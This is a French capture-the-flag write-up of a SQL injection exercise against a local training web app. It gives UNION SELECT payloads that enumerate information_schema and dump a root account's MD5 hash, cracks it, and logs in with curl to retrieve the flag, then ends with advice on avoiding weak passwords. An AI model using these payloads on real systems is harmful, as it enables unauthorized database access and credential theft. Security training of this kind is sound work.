# SQL Injection #3

## Exploitation

En utilisant le meme injection que dans [sqli_page_member](../../sqli_page_member)

On utilise cette query:

```sql
1 AND 1=2 UNION SELECT table_schema,table_name FROM information_schema.columns" and "1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

On se rend compte qu'il y a une database `Member_Brute_Force` avec une table `db_default`

On n'utilise cette query:

```sql
ID: 1 UNION SELECT username,password from Member_Brute_Force.db_default
```

On trouve:

```
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```

On decrypte avec md5, on obtient `shadow`.

On se login avec username `root` et password `shadow` pour obtenir le flag:

```bash
$> curl 'http://192.168.99.100/index.php?page=signin&username=root&password=shadow&Login=Login' | grep flag

The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>
```

## Note

Le password etant tres peu secure, nous aurions pu utiliser une attaque par Bruteforce pour trouver ces credentials.


## Resolution

Il est deconseillé d'utiliser des usernames trop communs comme `root` ou `admin`.

Il faut utiliser des mot de passe forts (chiffres + lettres + caracteres speciaux), length > 10,  pas de mots du dictionnaire.
